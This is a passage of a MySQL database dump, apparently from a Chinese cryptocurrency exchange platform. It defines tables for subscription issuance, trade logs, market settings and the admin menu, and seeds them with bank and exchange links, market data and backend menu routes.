  `invit_coin` varchar(50) NOT NULL,
  `invit_1` varchar(50) NOT NULL,
  `invit_2` varchar(50) NOT NULL,
  `invit_3` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `name` (`name`),
  KEY `coinname` (`coinname`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='认购发行表';

-- ----------------------------
-- Records of movesay_issue
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_issue_log
-- ----------------------------
DROP TABLE IF EXISTS `movesay_issue_log`;
CREATE TABLE `movesay_issue_log` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `name` varchar(255) NOT NULL,
  `coinname` varchar(50) NOT NULL,
  `buycoin` varchar(50) NOT NULL,
  `price` decimal(20,8) unsigned NOT NULL,
  `num` int(20) unsigned NOT NULL,
  `mum` decimal(20,8) unsigned NOT NULL,
  `ci` int(11) unsigned NOT NULL,
  `jian` varchar(255) NOT NULL,
  `unlock` int(11) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `status` (`status`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='认购记录表';

-- ----------------------------
-- Records of movesay_issue_log
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_link
-- ----------------------------
DROP TABLE IF EXISTS `movesay_link`;
CREATE TABLE `movesay_link` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(200) NOT NULL,
  `title` varchar(200) NOT NULL,
  `url` varchar(200) NOT NULL,
  `img` varchar(200) NOT NULL,
  `mytx` varchar(200) NOT NULL,
  `remark` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=23 DEFAULT CHARSET=utf8 COMMENT='常用银行地址';

-- ----------------------------
-- Records of movesay_link
-- ----------------------------
INSERT INTO `movesay_link` VALUES ('4', 'boc', 'BBTC', 'https://www.btcc.com/', 'img_56937003683ce.jpg', '', '', '0', '1452503043', '1476090198', '1');
INSERT INTO `movesay_link` VALUES ('5', 'abc', '农业银行', 'http://www.abchina.com/cn/', 'img_569370458b18d.jpg', '', '', '0', '1452503109', '0', '-1');
INSERT INTO `movesay_link` VALUES ('6', 'bccb', '北京银行', 'http://www.bankofbeijing.com.cn/', 'img_569370588dcdc.jpg', '', '', '0', '1452503128', '0', '-1');
INSERT INTO `movesay_link` VALUES ('8', 'ccb', '建设银行', 'http://www.ccb.com/', 'img_5693709bbd20f.jpg', '', '', '0', '1452503195', '0', '-1');
INSERT INTO `movesay_link` VALUES ('9', 'ceb', '光大银行', 'http://www.bankofbeijing.com.cn/', 'img_569370b207cc8.jpg', '', '', '0', '1452503218', '0', '-1');
INSERT INTO `movesay_link` VALUES ('10', 'cib', '兴业银行', 'http://www.cib.com.cn/cn/index.html', 'img_569370d29bf59.jpg', '', '', '0', '1452503250', '0', '-1');
INSERT INTO `movesay_link` VALUES ('11', 'citic', '中信银行', 'http://www.ecitic.com/', 'img_569370fb7a1b3.jpg', '', '', '0', '1452503291', '0', '-1');
INSERT INTO `movesay_link` VALUES ('12', 'cmb', '招商银行', 'http://www.cmbchina.com/', 'img_5693710a9ac9c.jpg', '', '', '0', '1452503306', '0', '-1');
INSERT INTO `movesay_link` VALUES ('13', 'cmbc', '民生银行', 'http://www.cmbchina.com/', 'img_5693711f97a9d.jpg', '', '', '0', '1452503327', '0', '-1');
INSERT INTO `movesay_link` VALUES ('14', 'comm', '交通银行', 'http://www.bankcomm.com/BankCommSite/default.shtml', 'img_5693713076351.jpg', '', '', '0', '1452503344', '0', '-1');
INSERT INTO `movesay_link` VALUES ('16', 'gdb', 'TFC', 'transfercoin.org', 'img_56937154bebc5.jpg', '', '', '0', '1452503380', '1476240419', '1');
INSERT INTO `movesay_link` VALUES ('17', 'icbc', 'COINBASE', 'https://www.coinbase.com/', 'img_56937162db7f5.jpg', '', '', '0', '1452503394', '1476088071', '1');
INSERT INTO `movesay_link` VALUES ('19', 'psbc', 'AMP', 'https://bittrex.com/', 'img_5693717eefaa3.jpg', '', '', '0', '1452503422', '1476086694', '1');
INSERT INTO `movesay_link` VALUES ('20', 'spdb', 'BLK', 'https://poloniex.com/', 'img_5693718f1d70e.jpg', '', '', '0', '1452503439', '1476028800', '1');
INSERT INTO `movesay_link` VALUES ('21', 'szpab', 'BTC', 'https://bitcoin.org/en/', '56c2e4c9aff85.jpg', '', '', '0', '1455613129', '1476028800', '1');
INSERT INTO `movesay_link` VALUES ('22', '12', '12', '12', '', '', '', '0', '1476028800', '1476028800', '-1');

-- ----------------------------
-- Table structure for movesay_log
-- ----------------------------
DROP TABLE IF EXISTS `movesay_log`;
CREATE TABLE `movesay_log` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `coinname` varchar(50) NOT NULL,
  `name` varchar(255) NOT NULL,
  `price` decimal(20,8) unsigned NOT NULL,
  `num` int(20) unsigned NOT NULL,
  `mum` decimal(20,8) unsigned NOT NULL,
  `unlock` int(11) unsigned NOT NULL,
  `ci` int(11) unsigned NOT NULL,
  `recycle` int(11) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `userid` (`userid`),
  KEY `coinname` (`coinname`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_log
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_market
-- ----------------------------
DROP TABLE IF EXISTS `movesay_market`;
CREATE TABLE `movesay_market` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(50) NOT NULL,
  `round` varchar(255) NOT NULL,
  `fee_buy` varchar(255) NOT NULL,
  `fee_sell` varchar(255) NOT NULL,
  `buy_min` varchar(255) NOT NULL,
  `buy_max` varchar(255) NOT NULL,
  `sell_min` varchar(255) NOT NULL,
  `sell_max` varchar(255) NOT NULL,
  `trade_min` varchar(255) NOT NULL,
  `trade_max` varchar(255) NOT NULL,
  `invit_buy` varchar(50) NOT NULL,
  `invit_sell` varchar(50) NOT NULL,
  `invit_1` varchar(50) NOT NULL,
  `invit_2` varchar(50) NOT NULL,
  `invit_3` varchar(50) NOT NULL,
  `zhang` varchar(255) NOT NULL,
  `die` varchar(255) NOT NULL,
  `hou_price` varchar(255) NOT NULL,
  `tendency` varchar(1000) NOT NULL,
  `trade` int(11) unsigned NOT NULL,
  `new_price` decimal(20,8) unsigned NOT NULL,
  `buy_price` decimal(20,8) unsigned NOT NULL,
  `sell_price` decimal(20,8) unsigned NOT NULL,
  `min_price` decimal(20,8) unsigned NOT NULL,
  `max_price` decimal(20,8) unsigned NOT NULL,
  `volume` decimal(20,8) unsigned NOT NULL,
  `change` decimal(20,8) NOT NULL,
  `api_min` decimal(20,8) unsigned NOT NULL,
  `api_max` decimal(20,8) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=10 DEFAULT CHARSET=utf8 COMMENT='行情配置表';

-- ----------------------------
-- Records of movesay_market
-- ----------------------------
INSERT INTO `movesay_market` VALUES ('9', 'sgc_cny', '2', '0', '5', '0.000001', '1000000', '0.000001', '1000000', '0.000001', '1000000', '0', '0', '0', '0', '0', '100', '0', '1.00000000', '[[1506509779,0],[1506524179,0],[1506538579,0],[1506552979,0],[1506567379,0],[1506581779,0],[1506596179,0],[1506610579,0],[1506624979,0],[1506639379,0],[1506653779,0],[1506668179,0],[1506682579,0],[1506696979,0],[1506711379,0],[1506725779,0],[1506740179,0],[1506754579,0],[1506768979,0]]', '1', '1.00000000', '7.00000000', '1.00000000', '1.00000000', '1.00000000', '10.00000000', '0.00000000', '0.00000000', '0.00000000', '0', '0', '0', '1');

-- ----------------------------
-- Table structure for movesay_market_json
-- ----------------------------
DROP TABLE IF EXISTS `movesay_market_json`;
CREATE TABLE `movesay_market_json` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `data` varchar(500) COLLATE utf8_unicode_ci NOT NULL,
  `type` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=33 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- ----------------------------
-- Records of movesay_market_json
-- ----------------------------
INSERT INTO `movesay_market_json` VALUES ('10', 'btc_cny', '', '', '0', '1476374399', '0', '0');
INSERT INTO `movesay_market_json` VALUES ('3', 'ltc_cny', '', '', '0', '1476287999', '0', '0');
INSERT INTO `movesay_market_json` VALUES ('4', 'doge_cny', '', '', '0', '1476287999', '0', '0');
INSERT INTO `movesay_market_json` VALUES ('5', 'eth_cny', '', '', '0', '1476287999', '0', '0');
INSERT INTO `movesay_market_json` VALUES ('6', 'ybc_cny', '', '', '0', '1476287999', '0', '0');
INSERT INTO `movesay_market_json` VALUES ('11', 'ltc_cny', '[\"2.00000000\",\"52.00000000\",\"0.00000000\",\"0.15600000\"]', '', '0', '1476201599', '0', '0');
INSERT INTO `movesay_market_json` VALUES ('12', 'doge_cny', '[\"3.00000000\",\"54.00000000\",\"0.00000000\",\"0.16200000\"]', '', '0', '1476201599', '0', '0');
INSERT INTO `movesay_market_json` VALUES ('13', 'eth_cny', '[\"17.00000000\",\"1429.00000000\",\"0.00000000\",\"4.28700000\"]', '', '0', '1476201599', '0', '0');
INSERT INTO `movesay_market_json` VALUES ('14', 'ybc_cny', '[\"18.00000000\",\"239.40000000\",\"0.00000000\",\"0.71820000\"]', '', '0', '1476201599', '0', '0');
INSERT INTO `movesay_market_json` VALUES ('15', 'btc_cny', '[\"2.00000000\",\"8324.20000000\",\"0.00000000\",\"24.97260000\"]', '', '0', '1476201599', '0', '0');
INSERT INTO `movesay_market_json` VALUES ('16', 'btc_cny', '[\"13.00000000\",\"220.00000000\",\"0.00000000\",\"0.66000000\"]', '', '0', '1476287999', '0', '0');
INSERT INTO `movesay_market_json` VALUES ('30', 'sgc_cny', '[\"5000.00000000\",\"35000.00000000\",\"0.00000000\",\"5.00000000\"]', '', '0', '1505491199', '0', '0');
INSERT INTO `movesay_market_json` VALUES ('31', 'sgc_cny', '', '', '0', '1506268799', '0', '0');
INSERT INTO `movesay_market_json` VALUES ('32', 'sgc_cny', '[\"10000.00000000\",\"70000.00000000\",\"0.00000000\",\"5.00000000\"]', '', '0', '1506182399', '0', '0');

-- ----------------------------
-- Table structure for movesay_menu
-- ----------------------------
DROP TABLE IF EXISTS `movesay_menu`;
CREATE TABLE `movesay_menu` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT '文档ID',
  `title` varchar(50) NOT NULL DEFAULT '' COMMENT '标题',
  `pid` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '上级分类ID',
  `sort` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '排序（同级有效）',
  `url` char(255) NOT NULL DEFAULT '' COMMENT '链接地址',
  `hide` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '是否隐藏',
  `tip` varchar(255) NOT NULL DEFAULT '' COMMENT '提示',
  `group` varchar(50) DEFAULT '' COMMENT '分组',
  `is_dev` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '是否仅开发者模式可见',
  `ico_name` varchar(50) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `pid` (`pid`)
) ENGINE=MyISAM AUTO_INCREMENT=449 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_menu
-- ----------------------------
INSERT INTO `movesay_menu` VALUES ('1', '系统', '0', '1', 'Index/index', '0', '', '', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('2', '内容', '0', '1', 'Article/index', '0', '', '', '0', 'list-alt');
INSERT INTO `movesay_menu` VALUES ('3', '用户', '0', '1', 'User/index', '0', '', '', '0', 'user');
INSERT INTO `movesay_menu` VALUES ('4', '财务', '0', '1', 'Finance/index', '0', '', '', '0', 'th-list');
INSERT INTO `movesay_menu` VALUES ('5', '交易', '0', '1', 'Trade/index', '0', '', '', '0', 'stats');
INSERT INTO `movesay_menu` VALUES ('6', '应用', '0', '1', 'Game/index', '0', '', '', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('7', '设置', '0', '1', 'Config/index', '0', '', '', '0', 'cog');
INSERT INTO `movesay_menu` VALUES ('8', '运营', '0', '1', 'Operate/index', '0', '', '', '0', 'share');
INSERT INTO `movesay_menu` VALUES ('9', '工具', '0', '1', 'Tools/index', '0', '', '', '0', 'wrench');
INSERT INTO `movesay_menu` VALUES ('10', '扩展', '0', '1', 'Cloud/index', '0', '', '', '0', 'tasks');
INSERT INTO `movesay_menu` VALUES ('11', '系统概览', '1', '1', 'Index/index', '0', '', '系统', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('12', '市场统计', '1', '3', 'Index/market', '0', '', '系统', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('13', '文章管理', '2', '1', 'Article/index', '0', '', '内容', '0', 'list-alt');
INSERT INTO `movesay_menu` VALUES ('14', '编辑添加', '13', '1', 'Article/edit', '1', '', '内容', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('15', '修改状态', '13', '100', 'Article/status', '1', '', '内容', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('16', '上传图片', '13', '2', 'Article/images', '0', '', '内容管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('18', '编辑', '17', '2', 'Adver/edit', '0', '', '内容管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('19', '修改', '17', '2', 'Adver/status', '0', '', '内容管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('21', '编辑', '20', '3', 'Chat/edit', '0', '', '聊天管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('22', '修改', '20', '3', 'Chat/status', '0', '', '聊天管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('23', '提示文字', '2', '1', 'Text/index', '0', '', '提示管理', '0', 'exclamation-sign');
INSERT INTO `movesay_menu` VALUES ('24', '编辑', '23', '1', 'Text/edit', '0', '', '提示管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('25', '修改', '23', '1', 'Text/status', '0', '', '提示管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('26', '用户管理', '3', '1', 'User/index', '0', '', '用户', '0', 'user');
INSERT INTO `movesay_menu` VALUES ('32', '确认转出', '26', '8', 'User/myzc_qr', '0', '', '用户管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('34', '编辑', '33', '2', 'User/index_edit', '0', '', '用户管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('35', '修改', '33', '2', 'User/index_status', '0', '', '用户管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('37', '财产修改', '26', '3', 'Usercoin/edit', '0', '', '用户管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('39', '新增用户组', '38', '0', 'AuthManager/createGroup', '0', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('40', '编辑用户组', '38', '0', 'AuthManager/editgroup', '1', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('41', '更新用户组', '38', '0', 'AuthManager/writeGroup', '1', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('42', '改变状态', '38', '0', 'AuthManager/changeStatus', '1', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('43', '访问授权', '38', '0', 'AuthManager/access', '1', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('44', '分类授权', '38', '0', 'AuthManager/category', '1', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('45', '成员授权', '38', '0', 'AuthManager/user', '1', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('46', '成员列表授权', '38', '0', 'AuthManager/tree', '1', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('47', '用户组', '38', '0', 'AuthManager/group', '1', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('48', '添加到用户组', '38', '0', 'AuthManager/addToGroup', '1', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('49', '用户组移除', '38', '0', 'AuthManager/removeFromGroup', '1', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('50', '分类添加到用户组', '38', '0', 'AuthManager/addToCategory', '1', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('51', '模型添加到用户组', '38', '0', 'AuthManager/addToModel', '1', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('53', '配置', '52', '1', 'Finance/config', '1', '', '', '0', '0');
INSERT INTO `movesay_menu` VALUES ('55', '类型', '52', '1', 'Finance/type', '1', '', '', '0', '0');
INSERT INTO `movesay_menu` VALUES ('56', '状态修改', '52', '1', 'Finance/type_status', '1', '', '', '0', '0');
INSERT INTO `movesay_menu` VALUES ('60', '修改', '57', '3', 'Mycz/status', '1', '', '充值管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('61', '状态修改', '57', '3', 'Mycztype/status', '1', '', '充值管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('64', '状态修改', '62', '5', 'Mytx/status', '1', '', '提现管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('65', '取消', '62', '5', 'Mytx/excel', '1', '', '提现管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('66', '导入excel', '9', '5', 'Mytx/exportExcel', '1', '', '提现管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('68', '委托管理', '5', '1', 'Trade/index', '0', '', '交易', '0', 'stats');
INSERT INTO `movesay_menu` VALUES ('69', '成交记录', '5', '2', 'Trade/log', '0', '', '交易', '0', 'stats');
INSERT INTO `movesay_menu` VALUES ('70', '修改状态', '68', '0', 'Trade/status', '1', '', '交易管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('71', '撤销挂单', '68', '0', 'Trade/chexiao', '1', '', '交易管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('74', '认购编辑', '72', '2', 'Issue/edit', '1', '', '认购管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('75', '认购修改', '72', '2', 'Issue/status', '1', '', '认购管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('79', '基本配置', '7', '1', 'Config/index', '0', '', '设置', '0', 'cog');
INSERT INTO `movesay_menu` VALUES ('80', '短信配置', '7', '2', 'Config/moble', '0', '', '设置', '0', 'cog');
INSERT INTO `movesay_menu` VALUES ('81', '客服配置', '7', '3', 'Config/contact', '0', '', '设置', '0', 'cog');
INSERT INTO `movesay_menu` VALUES ('82', '银行配置', '79', '4', 'Config/bank', '0', '', '网站配置', '0', 'credit-card');
INSERT INTO `movesay_menu` VALUES ('83', '编辑', '82', '4', 'Config/bank_edit', '1', '', '网站配置', '0', '0');
INSERT INTO `movesay_menu` VALUES ('85', '编辑', '84', '4', 'Coin/edit', '0', '', '网站配置', '0', '0');
INSERT INTO `movesay_menu` VALUES ('87', '状态修改', '84', '4', 'Coin/status', '1', '', '网站配置', '0', '0');
INSERT INTO `movesay_menu` VALUES ('89', '编辑市场', '88', '4', 'Market/edit', '0', '', '', '0', '0');
INSERT INTO `movesay_menu` VALUES ('91', '状态修改', '88', '4', 'Config/market_add', '1', '', '', '0', '0');
INSERT INTO `movesay_menu` VALUES ('92', '图形验证码', '95', '7', 'Verify/code', '1', '', '网站配置', '0', '0');
INSERT INTO `movesay_menu` VALUES ('93', '手机验证码', '95', '7', 'Verify/mobile', '1', '', '网站配置', '0', '0');
INSERT INTO `movesay_menu` VALUES ('94', '邮件验证码', '95', '7', 'Verify/email', '1', '', '网站配置', '0', '0');
INSERT INTO `movesay_menu` VALUES ('95', '其他配置', '7', '6', 'Config/qita', '0', '', '设置', '0', 'cog');
INSERT INTO `movesay_menu` VALUES ('97', '推广配置', '8', '2', 'Invit/config', '1', '', '推广管理', '0', 'cog');
INSERT INTO `movesay_menu` VALUES ('101', '其他模块调用', '9', '4', 'Tools/invoke', '1', '', '其他', '0', '0');
INSERT INTO `movesay_menu` VALUES ('102', '优化表', '9', '4', 'Tools/optimize', '1', '', '其他', '0', '0');
INSERT INTO `movesay_menu` VALUES ('103', '修复表', '9', '4', 'Tools/repair', '1', '', '其他', '0', '0');
INSERT INTO `movesay_menu` VALUES ('104', '删除备份文件', '9', '4', 'Tools/del', '1', '', '其他', '0', '0');
INSERT INTO `movesay_menu` VALUES ('105', '备份数据库', '9', '4', 'Tools/export', '1', '', '其他', '0', '');
INSERT INTO `movesay_menu` VALUES ('106', '还原数据库', '9', '4', 'Tools/import', '1', '', '其他', '0', '0');
INSERT INTO `movesay_menu` VALUES ('107', '导出数据库', '9', '4', 'Tools/excel', '1', '', '其他', '0', '0');
INSERT INTO `movesay_menu` VALUES ('108', '导出Excel', '9', '4', 'Tools/exportExcel', '1', '', '其他', '0', '0');
INSERT INTO `movesay_menu` VALUES ('109', '导入Excel', '9', '4', 'Tools/importExecl', '1', '', '其他', '0', '0');
INSERT INTO `movesay_menu` VALUES ('115', '图片', '111', '0', 'Shop/images', '0', '', '云购商城', '0', '0');
INSERT INTO `movesay_menu` VALUES ('116', '菜单管理', '7', '5', 'Menu/index', '1', '', '开发组', '0', 'list');
INSERT INTO `movesay_menu` VALUES ('117', '排序', '116', '5', 'Menu/sort', '0', '', '开发组', '0', '0');
INSERT INTO `movesay_menu` VALUES ('118', '添加', '116', '5', 'Menu/add', '0', '', '开发组', '0', '0');
INSERT INTO `movesay_menu` VALUES ('119', '编辑', '116', '5', 'Menu/edit', '0', '', '开发组', '0', '0');
INSERT INTO `movesay_menu` VALUES ('120', '删除', '116', '5', 'Menu/del', '0', '', '开发组', '0', '0');
INSERT INTO `movesay_menu` VALUES ('121', '是否隐藏', '116', '5', 'Menu/toogleHide', '0', '', '开发组', '0', '0');
INSERT INTO `movesay_menu` VALUES ('122', '是否开发', '116', '5', 'Menu/toogleDev', '0', '', '开发组', '0', '0');
INSERT INTO `movesay_menu` VALUES ('123', '导入文件', '7', '5', 'Menu/importFile', '1', '', '开发组', '0', 'log-in');
INSERT INTO `movesay_menu` VALUES ('124', '导入', '7', '5', 'Menu/import', '1', '', '开发组', '0', 'log-in');
INSERT INTO `movesay_menu` VALUES ('127', '用户登录', '3', '0', 'Login/index', '1', '', '用户配置', '0', '0');
INSERT INTO `movesay_menu` VALUES ('128', '用户退出', '3', '0', 'Login/loginout', '1', '', '用户配置', '0', '0');
INSERT INTO `movesay_menu` VALUES ('129', '修改管理员密码', '3', '0', 'User/setpwd', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('131', '用户详情', '3', '4', 'User/detail', '1', '', '前台用户管理', '0', 'time');
INSERT INTO `movesay_menu` VALUES ('132', '后台用户详情', '3', '1', 'AdminUser/detail', '1', '', '后台用户管理', '0', 'th-list');
INSERT INTO `movesay_menu` VALUES ('133', '后台用户状态', '3', '1', 'AdminUser/status', '1', '', '后台用户管理', '0', 'th-list');
INSERT INTO `movesay_menu` VALUES ('134', '后台用户新增', '3', '1', 'AdminUser/add', '1', '', '后台用户管理', '0', 'th-list');
INSERT INTO `movesay_menu` VALUES ('135', '后台用户编辑', '3', '1', 'AdminUser/edit', '1', '', '后台用户管理', '0', 'th-list');
INSERT INTO `movesay_menu` VALUES ('138', '编辑', '2', '1', 'Articletype/edit', '1', '', '内容管理', '0', 'list-alt');
INSERT INTO `movesay_menu` VALUES ('140', '编辑', '139', '2', 'Link/edit', '1', '', '内容管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('141', '修改', '139', '2', 'Link/status', '1', '', '内容管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('155', '服务器队列', '9', '3', 'Tools/queue', '0', '', '工具', '0', 'wrench');
INSERT INTO `movesay_menu` VALUES ('156', '钱包检查', '9', '3', 'Tools/qianbao', '0', '', '工具', '0', 'wrench');
INSERT INTO `movesay_menu` VALUES ('157', '币种统计', '1', '2', 'Index/coin', '0', '', '系统', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('158', '自动升级', '10', '2', 'Cloud/update', '0', '', '扩展', '0', 'tasks');
INSERT INTO `movesay_menu` VALUES ('163', '提示文字', '7', '5', 'Config/text', '0', '', '设置', '0', 'cog');
INSERT INTO `movesay_menu` VALUES ('220', '币种评论', '5', '4', 'Trade/comment', '0', '', '交易', '0', 'stats');
INSERT INTO `movesay_menu` VALUES ('237', '应用管理', '10', '3', 'Cloud/game', '0', '', '扩展', '0', 'tasks');
INSERT INTO `movesay_menu` VALUES ('278', '文章类型', '2', '2', 'Article/type', '0', '', '内容', '0', 'list-alt');
INSERT INTO `movesay_menu` VALUES ('279', '广告管理', '2', '3', 'Article/adver', '0', '', '内容', '0', 'list-alt');
INSERT INTO `movesay_menu` VALUES ('280', '友情链接', '2', '4', 'Article/link', '0', '', '内容', '0', 'list-alt');
INSERT INTO `movesay_menu` VALUES ('282', '登陆日志', '3', '4', 'User/log', '0', '', '用户', '0', 'user');
INSERT INTO `movesay_menu` VALUES ('283', '用户钱包', '3', '5', 'User/qianbao', '0', '', '用户', '0', 'user');
INSERT INTO `movesay_menu` VALUES ('284', '提现地址', '3', '6', 'User/bank', '0', '', '用户', '0', 'user');
INSERT INTO `movesay_menu` VALUES ('285', '用户财产', '3', '7', 'User/coin', '0', '', '用户', '0', 'user');
INSERT INTO `movesay_menu` VALUES ('286', '联系地址', '3', '8', 'User/goods', '0', '', '用户', '0', 'user');
INSERT INTO `movesay_menu` VALUES ('287', '交易聊天', '5', '3', 'Trade/chat', '0', '', '交易', '0', 'stats');
INSERT INTO `movesay_menu` VALUES ('288', '交易市场', '5', '5', 'Trade/market', '0', '', '交易', '0', 'stats');
INSERT INTO `movesay_menu` VALUES ('289', '交易推荐', '5', '6', 'Trade/invit', '0', '', '交易', '0', 'stats');
INSERT INTO `movesay_menu` VALUES ('290', '财务明细', '4', '1', 'Finance/index', '0', '', '财务', '0', 'th-list');
INSERT INTO `movesay_menu` VALUES ('291', '人民币充值', '4', '2', 'Finance/mycz', '0', '', '财务', '0', 'th-list');
INSERT INTO `movesay_menu` VALUES ('292', '人民币充值方式', '4', '3', 'Finance/myczType', '0', '', '财务', '0', 'th-list');
INSERT INTO `movesay_menu` VALUES ('293', '人民币提现', '4', '4', 'Finance/mytx', '0', '', '财务', '0', 'th-list');
INSERT INTO `movesay_menu` VALUES ('294', '人民币提现配置', '4', '5', 'Finance/mytxConfig', '0', '', '财务', '0', 'th-list');
INSERT INTO `movesay_menu` VALUES ('295', '虚拟币转入', '4', '6', 'Finance/myzr', '0', '', '财务', '0', 'th-list');
INSERT INTO `movesay_menu` VALUES ('296', '虚拟币转出', '4', '7', 'Finance/myzc', '0', '', '财务', '0', 'th-list');
INSERT INTO `movesay_menu` VALUES ('297', '修改状态', '291', '100', 'Finance/myczStatus', '1', '', '财务', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('298', '确认到账', '291', '100', 'Finance/myczQueren', '1', '', '财务', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('299', '编辑添加', '292', '1', 'Finance/myczTypeEdit', '1', '', '财务', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('300', '状态修改', '292', '2', 'Finance/myczTypeStatus', '1', '', '财务', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('301', '上传图片', '292', '2', 'Finance/myczTypeImage', '1', '', '财务', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('302', '修改状态', '293', '2', 'Finance/mytxStatus', '1', '', '财务', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('303', '导出选中', '293', '3', 'Finance/mytxExcel', '1', '', '财务', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('304', '正在处理', '293', '4', 'Finance/mytxChuli', '1', '', '财务', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('305', '撤销提现', '293', '5', 'Finance/mytxChexiao', '1', '', '财务', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('306', '确认提现', '293', '6', 'Finance/mytxQueren', '1', '', '财务', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('307', '确认转出', '296', '6', 'Finance/myzcQueren', '1', '', '财务', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('308', '云市场', '10', '1', 'Cloud/index', '0', '', '扩展', '0', 'tasks');
INSERT INTO `movesay_menu` VALUES ('309', '清理缓存', '9', '1', 'Tools/index', '0', '', '工具', '0', 'wrench');
